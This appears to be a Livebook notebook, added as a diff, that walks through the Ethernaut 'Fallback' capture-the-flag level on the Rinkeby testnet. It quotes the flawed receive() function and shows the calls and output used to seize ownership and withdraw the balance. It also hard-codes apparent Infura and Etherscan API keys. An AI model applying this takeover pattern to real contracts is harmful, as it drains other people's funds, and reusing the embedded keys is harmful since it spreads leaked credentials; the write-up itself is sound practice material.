@@ -1,0 +1,216 @@
+<!-- livebook:{"persist_outputs":true} -->
+
+# 1. Fallback
+
+```elixir
+EthClient.Context.set_rpc_host("https://rinkeby.infura.io/v3/70f9cf3592604f94a52a1922c2f081bb")
+EthClient.Context.set_chain_id(4)
+EthClient.Context.set_etherscan_api_key("2AJV1NZUNJFA92GV81D8CRNAV3NMJV6IS5")
+```
+
+<!-- livebook:{"output":true} -->
+
+```
+:ok
+```
+
+## Goal and method
+
+The goal in [this challenge](https://ethernaut.openzeppelin.com/level/0x9CB391dbcD447E645D6Cb55dE6ca23164130D008) is to change the ownership of the contract to yourself, and withdraw the contract balance.
+
+Reading the contract, we can see that we have 2 ways of change the ownership:
+
+```
+  function contribute() public payable {
+    require(msg.value < 0.001 ether);
+    contributions[msg.sender] += msg.value;
+    if(contributions[msg.sender] > contributions[owner]) {
+      owner = msg.sender;
+    }
+  }
+```
+
+or
+
+```
+  receive() external payable {
+    require(msg.value > 0 && contributions[msg.sender] > 0);
+    owner = msg.sender;
+  }
+```
+
+The first option requires us to send probably a lot of contributions, and that isn't good for us. The other option looks easier, we need just to contribute once and any amount is fine (way cheaper :) ), and then just transfer some amount > 0 ether.
+
+## Steps
+
+Here you set your instance address.
+
+```elixir
+instance_address = "0x6907650AF292E946bf285F4268bFB8A67Eb96700"
+```
+
+<!-- livebook:{"output":true} -->
+
+```
+"0x6907650AF292E946bf285F4268bFB8A67Eb96700"
+```
+
+Now we set the instance contract as our context contract.
+
+```elixir
+EthClient.Context.set_contract_address(instance_address)
+```
+
+<!-- livebook:{"output":true} -->
+
+```
+:ok
+```
+
+We are not the owners!
+
+```elixir
+EthClient.call("owner()", [])
+```
+
+<!-- livebook:{"output":true} -->
+
+```
+{:ok, "0x000000000000000000000000afb72ccaeb7e22c8a7640f605824b0898424b3da"}
+```
+
+Checking our contribution we can see that we are at 0.
+
+```elixir
+EthClient.call("getContribution()", [])
+```
+
+<!-- livebook:{"output":true} -->
+
+```
+{:ok, "0x0000000000000000000000000000000000000000000000000000b5e620f48000"}
+```
+
+So we contribute.
+
+```elixir
+EthClient.invoke("contribute()", [], 0.0001)
+```
+
+<!-- livebook:{"output":true} -->
+
+```
+estimated gas: {:ok, "0x6600"}
+
+21:45:55.549 [info]  Transaction accepted by the network, tx_hash: 0x3b6978cb252824938cdd187e5e233d802fd032d69254e9d28f27e5c54aaee3c4
+
+21:45:55.549 [info]  Waiting for confirmation...
+
+```
+
+<!-- livebook:{"output":true} -->
+
+```
+{:ok, "0x3b6978cb252824938cdd187e5e233d802fd032d69254e9d28f27e5c54aaee3c4"}
+```
+
+Now we can check that we send a contribution.
+
+```elixir
+EthClient.call("getContribution()", [])
+```
+
+<!-- livebook:{"output":true} -->
+
+```
+
+21:46:04.458 [info]  Transaction confirmed!
+
+21:46:04.458 [info]  Check it out here: https://rinkeby.etherscan.io/address/0x6907650AF292E946bf285F4268bFB8A67Eb96700
+
+```
+
+<!-- livebook:{"output":true} -->
+
+```
+{:ok, "0x000000000000000000000000000000000000000000000000000110d9316ec000"}
+```
+
+To be the owners, we need to transfer some ether to the contract.
+
+```elixir
+EthClient.transfer(0.00001)
+```
+
+<!-- livebook:{"output":true} -->
+
+```
+
+21:46:05.257 [info]  Transaction accepted by the network, tx_hash: 0x3979aa293396ccb73a6f0ec34f1a83f89700478f4aa22f51c7177d1a6f4a7c78
+
+21:46:05.257 [info]  Waiting for confirmation...
+
+21:46:17.667 [info]  Transaction confirmed!
+
+```
+
+<!-- livebook:{"output":true} -->
+
+```
+{:ok, "0x3979aa293396ccb73a6f0ec34f1a83f89700478f4aa22f51c7177d1a6f4a7c78"}
+```
+
+We are the owners now!
+
+```elixir
+EthClient.call("owner()", [])
+```
+
+<!-- livebook:{"output":true} -->
+
+```
+
+21:46:17.667 [info]  Check it out here: https://rinkeby.etherscan.io/address/0x6907650AF292E946bf285F4268bFB8A67Eb96700
+
+```
+
+<!-- livebook:{"output":true} -->
+
+```
+{:ok, "0x000000000000000000000000afb72ccaeb7e22c8a7640f605824b0898424b3da"}
+```
+
+So we can withdraw all the balance.
+
+```elixir
+EthClient.invoke("withdraw()", [])
+```
+
+<!-- livebook:{"output":true} -->
+
+```
+estimated gas: {:ok, "0x7f8d"}
+
+21:46:18.691 [info]  Transaction accepted by the network, tx_hash: 0x2acfb25a18113b22ca7072c333aa9d5bc6b66569210f209b8cf0acf300a10d0b
+
+21:46:18.691 [info]  Waiting for confirmation...
+
+21:46:33.642 [info]  Transaction confirmed!
+
+```
+
+<!-- livebook:{"output":true} -->
+
+```
+{:ok, "0x2acfb25a18113b22ca7072c333aa9d5bc6b66569210f209b8cf0acf300a10d0b"}
+```
+
+<!-- livebook:{"output":true} -->
+
+```
+
+21:46:33.642 [info]  Check it out here: https://rinkeby.etherscan.io/address/0x6907650AF292E946bf285F4268bFB8A67Eb96700
+
+```
+
+EZ
